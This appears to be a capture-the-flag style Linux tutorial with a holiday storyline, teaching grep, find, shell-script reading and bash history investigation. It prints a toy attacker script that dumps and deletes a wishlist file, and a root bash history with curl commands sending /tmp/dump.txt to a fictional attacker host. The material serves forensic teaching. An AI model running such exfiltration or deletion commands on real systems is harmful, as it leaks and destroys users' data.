
```
mcskidy@tbfc-web01:~/Guides$ ls -la drwxrwxr-x 2 mcskidy mcskidy 4096 Oct 13 01:26 .  
drwxr-x--- 19 mcskidy mcskidy 4096 Oct 23 12:29 ..  
-rw-rw-r-- 1 mcskidy mcskidy 504 Oct 13 01:26 .guide.txt
```

## Log files

`/var/log/`, a Linux directory where all security events (logs) are stored.

- Run `grep "Failed password" auth.log` to look for the failed logins inside the `auth.log`.

Grepping Logfiles

```shell-session
mcskidy@tbfc-web01:~$ cd /var/log
mcskidy@tbfc-web01:~$ grep "Failed password" auth.log
2025-10-13T01:43:48 tbfc-web01: Failed password for socmas from eggbox-196.hopsec.thm
[...]
```

## Finding the Files

- Run `find /home/socmas -name *egg*` to search for "eggs" in the socmas home directory.
- Note that `find` is a powerful command. Check out its [documentation](https://man7.org/linux/man-pages/man1/find.1.html) for more details.

Using Find Command

```shell-session
mcskidy@tbfc-web01:~$ find /home/socmas -name *egg*
/home/socmas/2025/eggstrike.sh
```

## Analyzing the Eggstrike

Files with the `.sh` extension contain CLI commands and are called shell scripts. Such scripts are used both by IT teams to automate things and by attackers to quickly run malicious commands.

Eggstrike Content

```shell-session
mcskidy@tbfc-web01:~$ cd /home/socmas/2025
mcskidy@tbfc-web01:~$ cat eggstrike.sh
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
```

1. The lines starting with `#` are just comments and are not the actual commands.
2. The `cat wishlist.txt | sort | uniq` lists unique items from the wishlist.txt.
3. The command then sends the output (unique orders) to the `/tmp/dump.txt` file.
4. The `rm wishlist.txt` deletes the wishlist file (containing Christmas wishes).
5. The `mv eastmas.txt wishlist.txt` replaces the original file with eastmas.txt.

## CLI Features

|Special Symbol|Description|Example|
|---|---|---|
|Pipe symbol (`\|`)|Send the output from the first command to the second|`cat unordered-list.txt \| sort \| uniq`|
|Output redirect (`>`/`>>`)|Use `>` to overwrite a file, and `>>` to append to the end|`some-long-command > /home/mcskidy/output.txt`|
|Double ampersand (`&&`)|Run the second command if the first was successful|`grep "secret" message.txt && echo "Secret found!"`|

## Bash History

Did you know that every command you run is saved in a hidden history file, also called Bash history? It is located at every user's home directory: `/home/mcskidy/.bash_history` for McSkidy, and `/root/.bash_history` for root, and you can check it with a convenient `history` command, or just read the files directly with `cat`. Let's check if Sir Carrotbane with his bad bunnies left their traces in history!

- Familiarize yourself with Bash history by running the `history` command.
- Note that your commands are also saved to a file (`cat .bash_history`).

Accessing Bash History

```shell-session
root@tbfc-web01:/home/mcskidy$ cd /root
root@tbfc-web01:~$ cat .bash_history
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
[...]
```
